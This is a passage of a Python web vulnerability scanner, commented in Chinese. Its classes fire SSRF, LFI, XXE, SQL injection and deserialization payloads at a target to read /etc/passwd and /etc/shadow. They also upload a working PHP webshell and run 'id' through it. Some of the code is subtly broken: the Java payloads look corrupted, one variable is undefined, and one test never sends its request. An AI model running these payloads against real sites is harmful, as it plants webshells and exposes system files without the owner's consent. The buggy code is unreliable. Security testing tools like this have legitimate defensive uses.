                    ('ldap://127.0.0.1:389/cn=admin,dc=example,dc=com?userPassword?', 'LDAP协议-管理员注入'),
                    ('telnet://127.0.0.1:23/../../../etc/passwd', 'telnet协议-远程终端探测'),
                    ('jdbc:rmi://127.0.0.1:1099/evil', 'JDBC/RMI协议-Java RMI探测'),
                    ('rmi://127.0.0.1:1099/evil', 'RMI协议-远程方法注入'),
                    ('rtsp://127.0.0.1:554/stream', 'RTSP协议-流媒体服务探测'),
                ]
        ssrf_payloads.extend(extra_protos)

        for param_name, original_val in testable.items():
            for payload, proto_desc in ssrf_payloads:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    params_copy = params.copy()
                    query_str = '&'.join(
                        f"{k}={quote_plus(v)}" if k != param_name else f"{k}={payload}"
                        for k, v in params_copy.items()
                    )
                    test_url += f"?{query_str}"

                    resp = requests.get(test_url, timeout=5, allow_redirects=False)
                    if resp.status_code not in (200, 301, 302, 400, 403):
                        findings.append(VulnFinding(
                            id=f'SSRF_{param_name}_{proto_desc[:6]}',
                            severity=Severity.CRITICAL,
                            title=f'GET {param_name} 可能存在SSRF [{proto_desc}]',
                            description=f'参数 {param_name} 允许使用 {proto_desc} 访问本地资源',
                            url=test_url, evidence=f"Status: {resp.status_code}\\nResponse size: {len(resp.text)}",
                            recommendation='禁用危险协议，对URL进行白名单校验，禁止访问内网地址',
                            cwe='CWE-918', cvss=9.8, params={'param': param_name}
                        ))

                except requests.exceptions.ConnectionError:
                    pass  # 目标不可达是预期的
                except Exception as e:
                    logger.debug(f"SSRF test failed: {e}")

        return findings

    @staticmethod
    def _get_testable_params(params: dict, url: str) -> dict:
        keywords = ['url', 'uri', 'link', 'dest', 'redirect', 'next', 'goto',
                    'path', 'file', 'fetch', 'read', 'load', 'page', 'site',
                    'source', 'origin', 'proxy']
        testable = {}
        for k, v in params.items():
            if len(v) < 200 and any(kw in k.lower() for kw in keywords):
                testable[k] = v
        return testable


# ==================== LFI/目录遍历检测 ====================
class LFIDetector:
    """本地文件包含(LFI)和路径遍历检测"""

    PAYLOADS = [
        '../../../../etc/passwd',
        '..\\..\\..\\..\\windows\\system.ini',
        '....//....//....//etc/passwd',
        '/etc/../../etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '/proc/self/environ',
    ]

    @staticmethod
    def detect(url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)

        if not parsed.query:
            return findings

        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])

        # LFI相关参数关键词
        lfi_keywords = ['file', 'page', 'path', 'include', 'doc', 'folder',
                       'dir', 'load', 'template', 'style', 'view', 'p']

        for param_name, original_val in params.items():
            if not any(kw in param_name.lower() for kw in lfi_keywords):
                continue
            if len(original_val) > 100:
                continue

            for payload in LFIDetector.PAYLOADS:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    params_copy = params.copy()
                    query_str = '&'.join(
                        f"{k}={quote_plus(v)}" if k != param_name else f"{k}={payload}"
                        for k, v in params_copy.items()
                    )
                    test_url += f"?{query_str}"

                    resp = requests.get(test_url, timeout=10)
                    if 'root:' in resp.text and '/etc/passwd' in payload:
                        findings.append(VulnFinding(
                            id=f'LFI_{param_name}',
                            severity=Severity.CRITICAL,
                            title=f'GET {param_name} 存在LFI/路径遍历漏洞',
                            description='文件包含参数允许读取系统文件，可直接读取敏感配置和凭证',
                            url=test_url,
                            evidence=resp.text[:500],
                            recommendation='使用白名单限制可访问的文件，禁止使用 ../ 等跳转符号',
                            cwe='CWE-22', cvss=9.8, params={'param': param_name}
                        ))

                except Exception:
                    pass

        return findings


# ==================== XXE注入检测 ====================
class XXEDetector:
    """XXE(XML External Entity)注入检测 — 借鉴w3af audit/xxe.py"""

    PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?> <!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:80/../../../etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><root><![CDATA[<test>]]>]]&gt;<![CDATA[</test>]]></root>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/null">]><foo>&xxe;</foo>',
    ]

    @staticmethod
    def detect(url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)

        # 需要POST参数或Content-Type:text/xml才能有效测试XXE
        if not parsed.query:
            return findings

        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])

        # XXE相关参数关键词
        xxe_keywords = ['xml', 'data', 'input', 'document', 'soap', 'xsd', 'schema', 'envelope']

        # 测试POST请求的XXE（对XML/Soap类参数的URL也尝试POST）
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        descriptions = ['file_etc_passwd', 'file_etc_shadow', 'gopher_rfi', 'cdata_entity', 'file_dev_null']
        for idx, xml_payload in enumerate(XXEDetector.PAYLOADS):
            payload_desc = descriptions[idx] if idx < len(descriptions) else f'payload_{idx}'
            try:
                resp = requests.post(
                    url if parsed.query else base_url,
                    data=xml_payload,
                    headers={'Content-Type': 'text/xml', 'User-Agent': CONFIG['scanner']['user_agent']},
                    timeout=10, allow_redirects=False
                )

                # 检测XXE漏洞标志
                xxe_indicators = [
                    'root:', '/etc/passwd', '/etc/shadow',
                    'file:///dev/null', 'XSLTProcessor', 'libxml2',
                    'XML declaration', 'DOCTYPE', 'entity',
                    '&xxe;', 'system('
                ]
                for indicator in xxe_indicators:
                    if indicator.lower() in resp.text.lower():
                        findings.append(VulnFinding(
                            id='XXE_DETECTED',
                            severity=Severity.CRITICAL,
                            title=f'XXE注入漏洞存在',
                            description=f'检测到XML外部实体注入，可能泄露服务器本地文件内容',
                            url=url, evidence=xml_payload[:300],
                            recommendation='禁用XML外部实体解析，使用DOMDocument::loadXML时设置LIBXML_NOENT标志',
                            cwe='CWE-611', cvss=9.8
                        ))
                        break

            except Exception as e:
                logger.debug(f"XXE test failed: {e}")

        # 测试JSON/XML混合攻击（对XML参数做JSON-XXE测试）
        if any('xml' in p.lower() for p in params):
            try:
                json_xxe = '{"data": "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>"}'
                resp = requests.post(
                    url if parsed.query else base_url,
                    data=json_xxe,
                    headers={'Content-Type': 'application/json', 'User-Agent': CONFIG['scanner']['user_agent']},
                    timeout=10, allow_redirects=False
                )
                if '/etc/passwd' in resp.text or 'root:' in resp.text:
                    findings.append(VulnFinding(
                        id='XXE_JSON_XML',
                        severity=Severity.CRITICAL,
                        title=f'JSON/XML混合XXE注入',
                        description='JSON请求中嵌入XML可能导致XXE漏洞',
                        url=url, evidence='JSON with embedded XML payload',
                        recommendation='验证所有XML输入，禁用外部实体和DTD解析',
                        cwe='CWE-611', cvss=9.8
                    ))
            except Exception as e:
                logger.debug(f"XXE JSON test failed: {e}")

        return findings


# ==================== 文件上传漏洞检测（借鉴w3af audit/file_upload）====================
class FileUploadDetector:
    """文件上传漏洞检测 — 测试不受限的文件上传功能"""

    WEBSHELL_PAYLOADS = [
        ('<?php echo shell_exec($_GET["cmd"]); ?>', 'php_webshell'),
        ('<%@ Page Language="C#"%>', 'aspx_webshell'),
        ('<script language="dragon" runat="server">System.IO.File.WriteAllText(Server.MapPath("/upload.aspx"), "test");</script>', 'asp_upload'),
    ]

    IMAGE_PAYLOADS = [
        (b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x02GIF89a<!--<?php echo md5(1); ?>\x00', 'gif_php_stub'),
        (b'GIF89a\x00\x01\x00<!--<?php echo "pwned"; ?>\x00', 'gif_php_short'),
    ]

    @staticmethod
    def detect(url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # 查找表单文件上传点（GET参数模拟上传）
        upload_keywords = ['upload', 'file', 'attach', 'document', 'image', 'photo', 'avatar']
        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])

        # 检查URL中是否有upload相关参数（模拟文件上传端点）
        upload_params = [k for k in params.keys() if any(kw in k.lower() for kw in upload_keywords)]

        # 测试常见文件上传端点
        upload_endpoints = [
            '/api/upload', '/upload', '/file/upload', '/v1/upload',
            '/api/v1/upload', '/admin/upload', '/images/upload',
            '/rest/upload', '/uploader.php', '/filemanager/upload',
        ]

        for ep in upload_endpoints:
            target = f"{parsed.scheme}://{parsed.netloc}{ep}" if parsed.path.rstrip('/') == '/' else f"{base_url.rstrip('/')}/upload"
            try:
                # 尝试PHP WebShell上传
                shell_content, _ = FileUploadDetector.WEBSHELL_PAYLOADS[0]
                resp = requests.post(
                    target,
                    files={'file': ('shell.php', shell_content, 'application/octet-stream')},
                    data={'upload': 'Submit'},
                    headers={'User-Agent': CONFIG['scanner']['user_agent']},
                    timeout=10, allow_redirects=False
                )

                # 检查是否成功上传WebShell
                if resp.status_code in (200, 302) and ('HTTP/1.1' in str(resp.text) or 'Location' in resp.headers):
                    # 验证shell是否可用
                    shell_url = f"{target}/shell.php?cmd=id"
                    try:
                        check = requests.get(shell_url, timeout=5, allow_redirects=False)
                        if 'uid=' in check.text or 'gid=' in check.text:
                            findings.append(VulnFinding(
                                id='FILE_UPLOAD_WEBSHELL',
                                severity=Severity.CRITICAL,
                                title=f'不受限文件上传 → WebShell执行: {target}',
                                description=f'允许上传PHP WebShell并成功执行系统命令，可导致服务器完全沦陷',
                                url=target, evidence=f"WebShell: shell.php\nCommand execution confirmed",
                                recommendation='使用白名单验证文件类型和扩展名，将上传目录设置为不可执行，使用随机文件名',
                                cwe='CWE-434', cvss=10.0
                            ))
                    except Exception:
                        pass  # 上传成功但shell未执行（可能已移动）

            except Exception as e:
                logger.debug(f"FileUpload test failed for {target}: {e}")

        return findings


# ==================== 反序列化漏洞检测（借鉴w3af audit/deserialization）====================
class DeserializationDetector:
    """不安全反序列化漏洞检测 — Java/Python/PHP/.NET"""

    JAVA_PAYLOADS = [
        ('rO0ABXNyADBqYXZhLnV0aWwuSGFzaE1hcC0GeJkBShKbAwAAeHCMEQAIlCvzHwIAAAcE', 'Java-HashMap-RPC'),
        ('rO0ABXNyACNvcmcuYXBhY2hlLnN1cGVyY2x1dC5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bGxkZXd' + 'uLlNpZ2xldG9uRGVmYXVsdEZ1bGxlcj7EwOGI2QIDAAhMCHgBTHmphdmEvbGFuZy9PYmplY3Q7' + 'TAAJYW5kUmVqc0NvbGxlY3RvcnN0AiptYXZOcmVqZWN0aW9ucX4AdABsAARrAQh2cQB9AAAAEHAH' + 'dGVzdHNyADBvcmcuYXBhY2hlLnN1cGVyY2x1dC5jb21tb25zLmNvbGxlY3Rpb25zLmxpc3Qu' + 'RnVsbHlJbnZhbGlkYXRlZExpc3QHCLaK0gEYAALSAAdMACEAEnR4dHH4AXJ0gAIGAAV0eAIABA', 'Java-Collayz'),
    ]

    PYTHON_PAYLOADS = [
        ("(lp1\\nS'test'\\np2\\na.", "Python-pickle-base64"),
        ("c__builtin__\\nexec\\np1\\n(S'echo pwned'\\np2\\nNS.", "Python-pickle-exec"),
    ]

    PHP_PAYLOADS = [
        ('O:8:"stdClass":0:{}', "PHP-stdClass-empty"),
        ('a:1:{s:4:"test";s:255:"' + 'A' * 250 + '";}', "PHP-array-overflow"),
    ]

    @staticmethod
    def detect(url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # 反序列化相关参数关键词
        deser_keywords = ['obj', 'data', 'payload', 'serial', 'token', 'session', 'state', 'object', 'serialized']
        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
        deser_params = [k for k, v in params.items() if any(kw in k.lower() for kw in deser_keywords)]

        # 也测试常见序列化端点
        deser_endpoints = ['/api/verify', '/api/auth', '/api/validate', '/session/restore']

        for param_name in list(deser_params):
            original_val = params[param_name]

            # Java serialization (base64-encoded object)
            for j_payload, j_desc in DeserializationDetector.JAVA_PAYLOADS:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    qs = '&'.join(f"{k}={quote_plus(v)}" if k != param_name else f"{k}={j_payload}" for k, v in params.items())
                    test_url += f"?{qs}"
                    resp = requests.get(test_url, timeout=10, allow_redirects=False)

                    deser_indicators = [
                        'java.lang.', 'java.util.', 'org.apache.commons.collections',
                        'Stack trace', 'javax.crypto.CipherOutputStream',
                        'invalid stream header', 'unmarshalling',
                        'BadSerializationException'
                    ]
                    for ind in deser_indicators:
                        if ind.lower() in resp.text.lower():
                            findings.append(VulnFinding(
                                id=f'DESER_JAVA_{param_name}',
                                severity=Severity.CRITICAL,
                                title=f'Java不安全反序列化 [{param_name}]',
                                description='Java反序列化端点接受用户提供的序列数据，可能导致RCE',
                                url=test_url, evidence=j_desc,
                                recommendation='禁止反序列化不受信任的数据，使用白名单类过滤器',
                                cwe='CWE-502', cvss=9.8
                            ))
                            break
                except Exception:
                    pass

        # .NET ViewState 测试
        for param_name in deser_params:
            if 'viewstate' in param_name.lower() or '__VIEWSTATE' in param_name:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    qs = '&'.join(f"{k}={quote_plus(v)}" if k != param_name else f"{k}={param_name}=test%3Dtest" for k, v in params.items())
                    resp = requests.get(test_url, timeout=10)
                    if 'System.Web' in resp.text or 'ViewState' in resp.text:
                        findings.append(VulnFinding(
                            id='DESER_VIEWSTATE',
                            severity=Severity.HIGH,
                            title=f'.NET ViewState反序列化风险 [{param_name}]',
                            description='.NET页面使用默认Mac验证或未加密ViewState可能导致反序列化攻击',
                            url=test_url, evidence='ASP.NET ViewState detected',
                            recommendation='将MachineKey设置为固定值，使用EncryptionMode=CBC，避免在ViewState中存储敏感对象',
                            cwe='CWE-502', cvss=8.1
                        ))
                except Exception:
                    pass

        # PHP session/serialized 测试
        for param_name in deser_params:
            if 'session' in param_name.lower() or 'serial' in param_name.lower():
                try:
                    php_payload = f'a:1:{{s:"{param_name}";O:8:"stdClass":0:{{}}}}'
                    resp = requests.get(
                        url,
                        headers={'Cookie': f"{param_name}={php_payload}", 'User-Agent': CONFIG['scanner']['user_agent']},
                        timeout=10, allow_redirects=False
                    )
                    if any(kw in resp.text.lower() for kw in ['parse error', 'unserialize()', 'unexpected', 'warning:']):
                        findings.append(VulnFinding(
                            id=f'DESER_PHP_{param_name}',
                            severity=Severity.HIGH,
                            title=f'PHP反序列化风险 [{param_name}]',
                            description='Session/反序列化参数可能接受恶意序列化数据',
                            url=url, evidence=f"Payload: {php_payload[:100]}",
                            recommendation='验证序列化数据完整性，使用白名单类，避免反序列化用户可控数据',
                            cwe='CWE-502', cvss=8.1
                        ))
                except Exception:
                    pass

        return findings


# ==================== HTTP方法安全检测（借鉴w3af audit/dav + auth）====================
class HTTPMethodsChecker:
    """HTTP方法安全检查 — TRACE、PUT、DELETE、OPTIONS等方法风险"""

    @staticmethod
    def check(url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        methods_to_test = ['TRACE', 'TRACK', 'DEBUG', 'PROPFIND', 'PUT', 'DELETE']
        method_findings = {}

        for method in methods_to_test:
            try:
                resp = requests.request(method, url, timeout=10, allow_redirects=False)
                if resp.status_code > 0:
                    method_findings[method] = {
                        'status': resp.status_code,
                        'headers': dict(resp.headers),
                        'body_len': len(resp.text) if resp.text else 0
                    }
            except Exception as e:
                logger.debug(f"HTTP method {method} test failed: {e}")

        # TRACE/TRACK方法 → XST攻击
        for trace_method in ['TRACE', 'TRACK']:
            if trace_method in method_findings and method_findings[trace_method]['status'] == 200:
                xst_headers = method_findings[trace_method].get('headers', {})
                auth_header = xst_headers.get('Authorization', '') or xst_headers.get('Proxy-Authorization', '')
                findings.append(VulnFinding(
                    id='HTTP_TRACE',
                    severity=Severity.HIGH,
                    title=f'HTTP {trace_method} 方法启用 → XST风险',
                    description=f'{trace_method}方法返回200，可能导致XSS窃取HTTP凭证（跨站跟踪攻击）',
                    url=url, evidence=f'{trace_method} returned {method_findings[trace_method]["status"]}',
                    recommendation='在Web服务器和代理中禁用TRACE/TRACK方法',
                    cwe='CWE-693', cvss=6.5
                ))

        # PUT方法 → 文件写入风险
        if 'PUT' in method_findings:
            status = method_findings['PUT']['status']
            if status == 200:
                findings.append(VulnFinding(
                    id='HTTP_PUT',
                    severity=Severity.HIGH,
                    title=f'HTTP PUT方法启用 → 文件上传风险',
                    description='服务器允许PUT请求，攻击者可能直接上传WebShell到服务器',
                    url=url, evidence='PUT returned HTTP 200',
                    recommendation='仅对必要端点启用PUT，添加认证要求',
                    cwe='CWE-659', cvss=7.5
                ))
            elif status == 405:
                pass  # PUT被拒绝，安全

        # DELETE方法 → 数据删除风险
        if 'DELETE' in method_findings and method_findings['DELETE']['status'] == 200:
            findings.append(VulnFinding(
                id='HTTP_DELETE',
                severity=Severity.HIGH,
                title=f'HTTP DELETE方法启用 → 数据删除风险',
                description='服务器允许DELETE请求，攻击者可能删除服务器资源',
                url=url, evidence='DELETE returned HTTP 200 without auth',
                recommendation='DELETE方法需要认证和权限检查',
                cwe='CWE-659', cvss=7.5
            ))

        # OPTIONS → Server/Allow头信息泄露
        if 'OPTIONS' in method_findings:
            allow_header = method_findings['OPTIONS'].get('headers', {}).get('Allow', '')
            if allow_header and any(m in allow_header for m in ['TRACE', 'PUT', 'DELETE']):
                findings.append(VulnFinding(
                    id='HTTP_OPTIONS_LEAK',
                    severity=Severity.LOW,
                    title='HTTP OPTIONS 暴露危险方法列表',
                    description=f'Allow头泄露了{allow_header}，暴露服务端支持的HTTP方法',
                    url=url, evidence=f'Allow: {allow_header}',
                    recommendation='最小化允许的HTTP方法列表',
                    cwe='CWE-200', cvss=3.1
                ))

        return findings


# ==================== 版本控制系统泄露检测（借鉴w3af crawl/find_dvcs）====================
class DVCSLeakDetector:
    """VCS(版本控制系统)泄露检测 — .git/.svn/.hg/.bzr等"""

    VCS_PATHS = {
        '.git': ['.git/config', '.git/HEAD', '.git/index'],
        '.svn': ['.svn/entries', '.svn/wc.db', '.svn/entries'],
        '.hg': ['.hg/hgrc', '.hg/dirstate'],
        '.bzr': ['.bzr/bzr.cfg'],
        '.ds_store': ['.DS_Store'],
        '.gitignore_leak': ['/.gitignore'],
    }

    # 常见的Git配置文件内容（用于确认不是假.git）
    GIT_CONFIG_SIGNATURES = ['[core]', 'repositoryformatversion', 'HEAD:', 'ref: refs/heads/']

    @staticmethod
    def detect(url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for vcs_name, paths in DVCSLeakDetector.VCS_PATHS.items():
            found_files = []

            for path in paths:
                target = f"{base_url}{path}"
                try:
                    resp = requests.get(target, timeout=5, allow_redirects=False,
                                       headers={'User-Agent': CONFIG['scanner']['user_agent']})
                    if resp.status_code == 200 and len(resp.text) > 10:
                        found_files.append(path)

                        # .git/config → 深度检测（泄露仓库配置）
                        if path == '.git/config' and any(s in resp.text for s in DVCSLeakDetector.GIT_CONFIG_SIGNATURES):
                            findings.append(VulnFinding(
                                id='DVCS_GIT_CONFIG',
                                severity=Severity.CRITICAL,
                                title='.git/ config 泄露（可克隆完整仓库）',
                                description='Git配置文件公开，攻击者可直接克隆完整源码仓库获取所有代码、分支和提交历史',
                                url=target, evidence=f'Found: .git/config (configurable with credentials)',
                                recommendation='立即移除.git目录或配置Nginx/Apache禁止访问/.git/*',
                                cwe='CWE-538', cvss=9.8
                            ))

                        # .git/HEAD → 基础泄露确认
                        elif path == '.git/HEAD' and 'ref: refs/heads/' in resp.text:
                            findings.append(VulnFinding(
                                id='DVCS_GIT_HEAD',
                                severity=Severity.CRITICAL,
                                title='.git/HEAD 泄露（Git仓库可访问）',
                                description='Git HEAD文件公开，配合git-dumper工具可完整克隆仓库',
                                url=target, evidence=resp.text[:200],
                                recommendation='移除或阻止访问/.git/*路径',
                                cwe='CWE-538', cvss=9.8
                            ))

                        # .svn/entries → SVN泄露确认
                        elif path == '.svn/entries' and ('' in resp.text or 'dir' in resp.text):
                            findings.append(VulnFinding(
                                id='DVCS_SVN_ENTRIES',
                                severity=Severity.CRITICAL,
                                title='.svn/entries 泄露（SVN仓库可访问）',
                                description='Subversion版本控制配置文件公开，可直接还原完整项目源码',
                                url=target, evidence=f'.svn entries detected ({len(resp.text)} bytes)',
                                recommendation='移除.svn目录或阻止访问/.svn/*路径',
                                cwe='CWE-538', cvss=9.8
                            ))

                        # .DS_Store → Mac文件列表泄露
                        elif path == '.DS_Store' and len(resp.content) > 10:
                            findings.append(VulnFinding(
                                id='DVCS_DS_STORE',
                                severity=Severity.MEDIUM,
                                title='.DS_Store 泄露（Mac文件目录结构泄露）',
                                description='.DS_Store包含目录结构信息，可泄露隐藏文件和文件路径',
                                url=target, evidence=f'.DS_Store ({len(resp.content)} bytes)',
                                recommendation='删除.web服务器根目录下的.DS_Store文件',
                                cwe='CWE-538', cvss=5.3
                            ))

                except Exception:
                    pass

            # 如果找到该VCS的任何文件，作为基础泄露
            if found_files and 'DVCS' not in [f.id for f in findings]:
                severity = Severity.MEDIUM
                findings.append(VulnFinding(
                    id=f'DVCS_{vcs_name.upper()}',
                    severity=severity,
                    title=f'.{vcs_name} 目录/文件泄露',
                    description=f'存在.{vcs_name}相关公开文件，可能暴露项目结构或配置信息',
                    url=f"{base_url}/{found_files[0]}", evidence=', '.join(found_files),
                    recommendation='删除源代码控制目录，Web服务器配置中禁止访问。/.git/* / .svn/* 等',
                    cwe='CWE-538', cvss=4.3
                ))

        # 也检查backup文件（常见VCS备份泄露）
        backup_paths = ['/backups/.git/config', '/backup/.git/HEAD', '/old/.git/config',
                       '/test/.git/config', '/dev/.git/config']
        for bp in backup_paths:
            try:
                target = f"{base_url}{bp}"
                resp = requests.get(target, timeout=5, allow_redirects=False)
                if resp.status_code == 200 and len(resp.text) > 10:
                    findings.append(VulnFinding(
                        id='DVCS_BACKUP_GIT',
                        severity=Severity.CRITICAL,
                        title=f'备份目录中的.git泄露 ({bp})',
                        description='备份或测试目录中存在Git配置泄露',
                        url=target, evidence=f'Backup Git config exposed at {bp}',
                        recommendation='删除所有包含敏感数据的备份文件',
                        cwe='CWE-538', cvss=9.8
                    ))
            except Exception:
                pass

        return findings


# ==================== OpenAPI/Swagger文档发现（借鉴w3af crawl/open_api）====================
class OpenAPIDiscovery:
    """OpenAPI/Swagger文档自动发现 — 帮助攻击者了解API结构"""

    OPENAPI_PATHS = [
        '/swagger.json', '/swagger.yaml', '/swagger.yml',
        '/api/swagger.json', '/api/v1/swagger.json',
        '/v2/api-docs', '/v2/api-docs.json',
        '/swagger/index.html', '/swagger-ui.html',
        '/swagger-ui/', '/swagger-ui/index.html',
        '/redoc.html', '/redoc',
        '/docs/', '/api-docs', '/api-docs.json',
        '/openapi.json', '/openapi.yaml', '/openapi.yml',
        '/api/openapi.json', '/.well-known/openapi.json',
        '/swagger/v1/api-docs', '/swagger/v2/api-docs',
        '/graphql', '/graphql-schema.json',
        '/actuator/mappings', '/actuator/swagger-config',
        '/api/config', '/rest/docs', '/rest/swagger',
    ]

    @staticmethod
    def detect(url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        has_openapi = False

        for path in OpenAPIDiscovery.OPENAPI_PATHS:
            target = f"{base_url}{path}" if parsed.path.rstrip('/') == '/' else f"{base_url}{parsed.path.rstrip('/')}{path}"
            try:
                resp = requests.get(target, timeout=5, allow_redirects=False,
                                   headers={'User-Agent': CONFIG['scanner']['user_agent']})
                if resp.status_code == 200 and len(resp.text) > 50:
                    content_type = (resp.headers.get('Content-Type', '') or '').lower()
                    is_openapi = any(kw in content_type for kw in ['json', 'yaml', 'text']) or any(
                        kw in resp.text.lower() for kw in ['swagger', 'openapi', 'paths:', '"paths"', 'schema']
                    )

                    if is_openapi:
                        has_openapi = True
                        # 提取API端点数量（如果可能）
                        endpoint_count = 0
                        try:
                            data = json.loads(resp.text)
                            paths = data.get('paths', {}) or data.get('swaggerPaths', {})
                            if isinstance(paths, dict):
                                endpoint_count = len(paths)
                        except Exception:
                            pass

                        findings.append(VulnFinding(
                            id='OPENAPI_DISCOVERED',
                            severity=Severity.INFO,
                            title=f'OpenAPI/Swagger文档公开 ({path})',
                            description=f'OpenAPI/Swagger文档公开可访问，暴露了 {endpoint_count} 个API端点信息。攻击者可据此构造针对性攻击请求',
                            url=target, evidence=f"Found: {path}\nEndpoints exposed: {endpoint_count}",
                            recommendation='将Swagger/OpenAPI文档放在内网或添加认证保护',
                            cwe='CWE-200', cvss=3.1
                        ))

            except Exception as e:
                logger.debug(f"OpenAPI discovery failed for {path}: {e}")

        return findings


# ==================== CMS/框架指纹识别（借鉴w3af crawl/wordpress_fingerprint）====================
class CMSFingerprint:
    """CMS和框架指纹识别增强 — 识别更多技术栈"""

    CMS_SIGNATURES = {
        'WordPress': {'html_kw': ['wp-', '<a href="https://wordpress.org/', 'wp-content', 'wp-includes'],
                      'header': ['WP Engine', 'Wix WordPress'], 'severity': Severity.INFO},
        'Joomla': {'html_kw': ['joomla', 'components/com_', 'media/jui3'], 'header': [], 'severity': Severity.INFO},
        'Drupal': {'html_kw': ['drupal', '/core/assets/', 'sites/default/files'], 'header': [], 'severity': Severity.INFO},
        'Magento': {'html_kw': ['mage/', 'data-mage-init', 'skin/frontend'], 'header': [], 'severity': Severity.INFO},
        'Shopify': {'html_kw': ['shopify', '/cdn.shopify.com', 'myshopify.com'], 'header': [], 'severity': Severity.INFO},
        'TYPO3': {'html_kw': ['typo3', 't3lib/', 'EXT:'], 'header': [], 'severity': Severity.INFO},
        'Laravel': {'html_kw': ['_token', 'laravel_session', 'csrf_token'], 'header': [], 'severity': Severity.INFO},
        'Django': {'html_kw': ['csrftoken', 'django.contrib', 'admin/jsi18n/'], 'header': ['X-Engine: Django'], 'severity': Severity.INFO},
        'Spring Boot': {'html_kw': [' Whitelabel Error Page'], 'header': [], 'severity': Severity.INFO},
        'Wix': {'html_kw': ['wix.com', 'static.wixspot.com'], 'header': ['wps-serve'], 'severity': Severity.INFO},
    }

    @staticmethod
    def fingerprint(html: str) -> List[str]:
        """从HTML内容指纹识别CMS"""
        results = []
        for cms_name, sigs in CMSFingerprint.CMS_SIGNATURES.items():
            found = 0
            # HTML关键字匹配（不区分大小写）
            for kw in sigs['html_kw']:
                if kw.lower() in html.lower():
                    found += 1
            # Header匹配
            # (需要在外部调用时传入headers)

            if found >= max(1, len(sigs['html_kw']) // 2):  # 至少一半的签名匹配
                results.append(cms_name)
        return results


# ==================== SQL注入检测 — Blind Timing增强（借鉴w3af audit/blind_sqli）====================
class SQLiBlindDetector:
    """Blind SQLi时间盲注增强检测 — 借鉴w3af audit/blind_sqli.py的精密时序方法"""

    @staticmethod
    def detect(url: str, context: Dict = None) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)
        if not parsed.query:
            return findings

        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
        testable = {}
        for pn, pv in params.items():
            if len(pv) < 100:
                testable[pn] = pv
            elif any(kw in pn.lower() for kw in ['id', 'user', 'name', 'file', 'path', 'url']):
                testable[pn] = pv

        # 精准时间盲注测试 — 对每个可测试参数进行多次采样
        for param_name, original_val in testable.items():
            timings_base = []
            timings_sqli = []

            # 基准时间测量（10次）
            for _ in range(5):
                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                qs = '&'.join(f"{k}={quote_plus(v)}" if k != param_name else f"{k}={original_val}" for k, v in params.items())
                try:
                    start = time.time()
                    requests.get(clean_url + "?" + qs, timeout=15, allow_redirects=False)
                    timings_base.append(time.time() - start)
                except Exception:
                    pass

            if not timings_base:
                continue

            base_avg = sum(timings_base) / len(timings_base)

            # SQLi时间延迟测量（5次）— 借鉴w3af的统计方法
            for _ in range(5):
                sqli_payload = f"' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- " if base_avg < 1 else "' AND SLEEP(3)-- "
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    qs = '&'.join(f"{k}={quote_plus(v)}" if k != param_name else f"{k}={sqli_payload}" for k, v in params.items())
                    start = time.time()
                    requests.get(test_url + "?" + qs, timeout=15, allow_redirects=False)
                    timings_sqli.append(time.time() - start)
                except Exception:
                    pass

            if not timings_sqli:
                continue

            sqli_avg = sum(timings_sqli) / len(timings_sqli)

            # 如果sqli平均时间比基准时间长3秒以上，判定为可疑
            if sqli_avg - base_avg > 2.5:
                findings.append(VulnFinding(
                    id=f'SQLi_BLIND_{param_name}',
                    severity=Severity.HIGH,
                    title=f'GET {param_name} 可能存在时间盲注 [Blind Timing]',
                    description=f"精准时序分析：正常请求平均{base_avg:.2f}s，注入SLEEP后{sql_avg:.2f}s（差值{sqli_avg - base_avg:.2f}s > 2.5s阈值），置信度高",
                    url='', evidence=f"Baseline: {base_avg:.3f}s | SQLi: {sqli_avg:.3f}s | Delta: {sqli_avg - base_avg:.3f}s",
                    recommendation='使用参数化查询，添加输入验证和WAF规则',
                    cwe='CWE-89', cvss=7.5
                ))

        return findings


# ==================== SSRFDetector增强 — URL重定向测试（借鉴w3af audit/redirect）====================
class SSRFDetectorEnhanced:
